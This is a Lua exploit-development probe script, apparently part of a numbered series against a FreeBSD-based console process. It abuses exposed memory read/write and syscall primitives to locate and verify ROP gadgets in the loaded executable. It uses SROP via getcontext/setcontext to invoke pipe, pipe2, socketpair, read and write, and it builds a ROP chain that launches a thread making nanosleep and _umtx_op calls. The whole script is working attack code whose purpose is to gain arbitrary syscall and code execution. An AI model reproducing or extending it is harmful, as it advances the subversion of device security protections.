-- CRASH_CLASS: LOW
-- PROBE 142o: Verify new gadgets + test pipe/socketpair via SROP
--
-- 142n found: pop_rdx;ret at +0x420E6D, mov[rdi],rax;ret at +0xD0B60,
-- mov[rdi],eax;ret at +0x92C68, pop_rcx;ret at +0xE64.
-- Process crashed during scan before pipe tests ran. This probe:
-- [A] Verify gadget bytes at each offset
-- [B] pipe(42) via SROP
-- [C] socketpair(135) via SROP
-- [D] pipe read/write test
-- [E] Thread with pop_rdx: full 6-arg syscall from child thread

print("=== PROBE 142o: VERIFY+PIPE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP setup
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. hex(eboot))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_pop_rcx = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))
local g_wr_qword = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))
local g_wr_eax   = uint64(string.format("0x%X%08X", ehi, elo + 0x92C68))

--------------------------------------------------------------------
-- [A] Verify gadget bytes
--------------------------------------------------------------------
print("")
print("--- [A] Verify gadgets ---")

local function read_bytes(base, off, count)
    local s = ""
    for i = 0, count - 1 do
        local d = safe_rd(base + off + i - (i % 4))
        if d then
            local shift = (i % 4) * 8
            local b = math.floor(d / (2^shift)) % 256
            s = s .. string.format("%02X ", b)
        else
            s = s .. "?? "
        end
    end
    return s
end

-- Read 4 bytes at each gadget offset (more efficient)
local function verify_gadget(name, off, expected)
    local d = safe_rd(eboot + off)
    if not d then
        print("[A] " .. name .. " at +0x" .. string.format("%X", off) .. ": READ FAIL")
        return false
    end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    local bytes = string.format("%02X %02X %02X %02X", b0, b1, b2, b3)
    print("[A] " .. name .. " at +0x" .. string.format("%X", off) .. ": " .. bytes)
    return true
end

-- For pop_rdx at odd offset, we need to read aligned dword and extract
local function verify_odd_gadget(name, off)
    local aligned = off - (off % 4)
    local byte_off = off % 4
    local d = safe_rd(eboot + aligned)
    if not d then
        print("[A] " .. name .. " at +0x" .. string.format("%X", off) .. ": READ FAIL")
        return false
    end
    local d2 = safe_rd(eboot + aligned + 4)

    local bytes = {}
    for i = 0, 3 do
        local shift = i * 8
        bytes[i] = math.floor(d / (2^shift)) % 256
    end
    if d2 then
        for i = 0, 3 do
            local shift = i * 8
            bytes[4 + i] = math.floor(d2 / (2^shift)) % 256
        end
    end

    local s = ""
    for i = byte_off, math.min(byte_off + 3, 7) do
        s = s .. string.format("%02X ", bytes[i])
    end
    print("[A] " .. name .. " at +0x" .. string.format("%X", off) .. ": " .. s)

    if bytes[byte_off] == 0x5A and bytes[byte_off + 1] == 0xC3 then
        print("[A] *** pop_rdx;ret CONFIRMED! ***")
        return true
    end
    return false
end

verify_gadget("ret", 0x42, nil)
verify_gadget("pop_rax;ret", 0x992, nil)
verify_gadget("pop_rsi;ret", 0xD77D, nil)
verify_gadget("pop_rdi;ret", 0xC9DFE, nil)
verify_gadget("pop_rcx;ret", 0xE64, nil)
verify_gadget("mov[rdi],eax;ret", 0x92C68, nil)
verify_gadget("mov[rdi],rax;ret", 0xD0B60, nil)
verify_odd_gadget("pop_rdx;ret", 0x420E6D)

--------------------------------------------------------------------
-- [B] pipe(42) via SROP
--------------------------------------------------------------------
print("")
print("--- [B] pipe via SROP ---")

local pipe_fds = gpu + 0x1000
wd(pipe_fds, 0xDEAD)
wd(pipe_fds + 4, 0xDEAD)

local rv_pipe = srop(42, ua(pipe_fds))
local pvh, pvl = get_hi_lo(rv_pipe)
local fd0 = safe_rd(pipe_fds)
local fd1 = safe_rd(pipe_fds + 4)
print("[B] pipe ret=" .. hex(rv_pipe) .. " fd0=" .. (fd0 or "nil") .. " fd1=" .. (fd1 or "nil"))

if pvl == 0 and pvh == 0 then
    print("[B] *** PIPE WORKS VIA SROP! ***")
end

-- Also try FreeBSD pipe2(542)
local p2_fds = gpu + 0x1010
wd(p2_fds, 0xDEAD)
wd(p2_fds + 4, 0xDEAD)

local rv_p2 = srop(542, ua(p2_fds), uint64(0))
local p2h, p2l = get_hi_lo(rv_p2)
local p2fd0 = safe_rd(p2_fds)
local p2fd1 = safe_rd(p2_fds + 4)
print("[B] pipe2 ret=" .. hex(rv_p2) .. " fd0=" .. (p2fd0 or "nil") .. " fd1=" .. (p2fd1 or "nil"))

if p2l == 0 and p2h == 0 then
    print("[B] *** PIPE2 WORKS! ***")
end

--------------------------------------------------------------------
-- [C] socketpair(135) via SROP
--------------------------------------------------------------------
print("")
print("--- [C] socketpair via SROP ---")

local sp_fds = gpu + 0x1020
wd(sp_fds, 0xDEAD)
wd(sp_fds + 4, 0xDEAD)

local rv_sp = srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local svh, svl = get_hi_lo(rv_sp)
local sfd0 = safe_rd(sp_fds)
local sfd1 = safe_rd(sp_fds + 4)
print("[C] socketpair ret=" .. hex(rv_sp) .. " fd0=" .. (sfd0 or "nil") .. " fd1=" .. (sfd1 or "nil"))

if svl == 0 and svh == 0 then
    print("[C] *** SOCKETPAIR WORKS! ***")
end

--------------------------------------------------------------------
-- [D] pipe read/write test (if any pipe worked)
--------------------------------------------------------------------
local pipe_read_fd = nil
local pipe_write_fd = nil

if fd0 and fd0 ~= 0xDEAD and fd1 and fd1 ~= 0xDEAD and pvl == 0 then
    pipe_read_fd = fd0
    pipe_write_fd = fd1
    print("[D] Using pipe fds: read=" .. fd0 .. " write=" .. fd1)
elseif p2fd0 and p2fd0 ~= 0xDEAD and p2fd1 and p2fd1 ~= 0xDEAD and p2l == 0 then
    pipe_read_fd = p2fd0
    pipe_write_fd = p2fd1
    print("[D] Using pipe2 fds: read=" .. p2fd0 .. " write=" .. p2fd1)
end

if pipe_read_fd then
    print("")
    print("--- [D] pipe read/write ---")

    local wbuf = gpu + 0x2000
    wd(wbuf, 0x4C4C4548)     -- "HELL"
    wd(wbuf + 4, 0x0000004F) -- "O\0"

    local rv_w = srop(4, uint64(pipe_write_fd), ua(wbuf), uint64(5))
    local wh, wl = get_hi_lo(rv_w)
    print("[D] write(5) ret=" .. hex(rv_w))

    local rbuf = gpu + 0x3000
    wd(rbuf, 0)
    wd(rbuf + 4, 0)
    wd(rbuf + 8, 0)

    local rv_r = srop(3, uint64(pipe_read_fd), ua(rbuf), uint64(5))
    local rrh, rrl = get_hi_lo(rv_r)
    print("[D] read(5) ret=" .. hex(rv_r))

    local r0 = safe_rd(rbuf)
    local r1 = safe_rd(rbuf + 4)
    print("[D] read bytes: 0x" .. string.format("%08X %08X", r0 or 0, r1 or 0))
    if r0 == 0x4C4C4548 then
        print("[D] *** PIPE I/O CONFIRMED! 'HELL' read back ***")
    end
else
    print("")
    print("--- [D] SKIPPED: no working pipe ---")
end

--------------------------------------------------------------------
-- [E] Thread with full 6-arg syscall via pop_rdx
-- Test: child thread calls getpid(20) then writes result to GPU mem
-- Actually: child calls mmap with pop_rdx controlling size arg
--------------------------------------------------------------------
print("")
print("--- [E] Thread with pop_rdx ---")

-- Timespec for keep-alive
local tspec = gpu + 0x4000
wq(tspec, uint64(30))    -- 30 seconds
wq(tspec + 8, uint64(0))

-- Futex for LOCK_PI side-effect
local futex_e = gpu + 0x4100
wq(futex_e, uint64(0))

-- ROP chain:
-- 1. short nanosleep (200ms settle)
-- 2. LOCK_PI on futex (side-effect: writes to futex_e)
-- 3. Try mmap with pop_rdx controlling prot argument
-- 4. Long nanosleep keep-alive (30s)

local tspec_short = gpu + 0x4200
wq(tspec_short, uint64(0))
wq(tspec_short + 8, uint64(200000000))  -- 200ms

local rop_e = gpu + 0x10000
local i = 0

-- 1. Short nanosleep
wq(rop_e + i, g_pop_rdi); i=i+8
wq(rop_e + i, ua(tspec_short)); i=i+8
wq(rop_e + i, g_pop_rsi); i=i+8
wq(rop_e + i, uint64(0)); i=i+8
wq(rop_e + i, g_pop_rax); i=i+8
wq(rop_e + i, uint64(240)); i=i+8
wq(rop_e + i, sc_addr); i=i+8

-- 2. LOCK_PI (op=12) on futex
wq(rop_e + i, g_pop_rdi); i=i+8
wq(rop_e + i, ua(futex_e)); i=i+8
wq(rop_e + i, g_pop_rsi); i=i+8
wq(rop_e + i, uint64(12)); i=i+8  -- UMTX_OP_MUTEX_LOCK = 12
wq(rop_e + i, g_pop_rdx); i=i+8
wq(rop_e + i, uint64(0)); i=i+8   -- val = 0
wq(rop_e + i, g_pop_rax); i=i+8
wq(rop_e + i, uint64(454)); i=i+8  -- _umtx_op
wq(rop_e + i, sc_addr); i=i+8

-- 3. Long nanosleep keep-alive
wq(rop_e + i, g_pop_rdi); i=i+8
wq(rop_e + i, ua(tspec)); i=i+8
wq(rop_e + i, g_pop_rsi); i=i+8
wq(rop_e + i, uint64(0)); i=i+8
wq(rop_e + i, g_pop_rax); i=i+8
wq(rop_e + i, uint64(240)); i=i+8
wq(rop_e + i, sc_addr); i=i+8

-- Create thread
local ctx_e = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_e + off, 0) end
pcall(function() return sc_gc(uint64(ctx_e)) end)
wq(ctx_e + 0xE0, g_ret)        -- RIP = ret gadget
wq(ctx_e + 0xF8, ua(rop_e))    -- RSP = ROP chain

local tid_e = gpu + 0x30000
wq(tid_e, uint64(0xDEADDEAD))

print("[E] Creating thread with pop_rdx in ROP...")
local ok_e, rv_e = pcall(function()
    return sc_thr_create(uint64(ctx_e), uint64(tid_e), uint64(0))
end)
local ntid_e = safe_rq(tid_e)
local neh, nel = get_hi_lo(ntid_e)
print("[E] ok=" .. tostring(ok_e) .. " rv=" .. tostring(rv_e) .. " tid=" .. nel)

-- Wait 500ms and check
local ts_wait = memory.alloc(16)
wq(ts_wait, uint64(0))
wq(ts_wait + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

-- Check thread alive
if nel ~= 0 and nel ~= 0xDEADDEAD then
    local rv_k = srop(433, uint64(nel), uint64(0))
    local kh, kl = get_hi_lo(rv_k)
    print("[E] thr_kill=" .. hex(rv_k) .. " (0=alive)")
    if kl == 0 and kh == 0 then
        print("[E] *** THREAD WITH pop_rdx IS ALIVE! ***")
    end
end

-- Check futex side-effect
local futex_val = safe_rd(futex_e)
print("[E] futex=" .. (futex_val or "nil") .. " (expect non-zero if LOCK_PI worked)")
if futex_val and futex_val ~= 0 then
    print("[E] *** LOCK_PI WITH pop_rdx CONFIRMED! val=" .. futex_val .. " ***")
    print("[E] *** FULL 6-ARG THREAD ROP CONFIRMED! ***")
end

print("")
print("=== DONE ===")
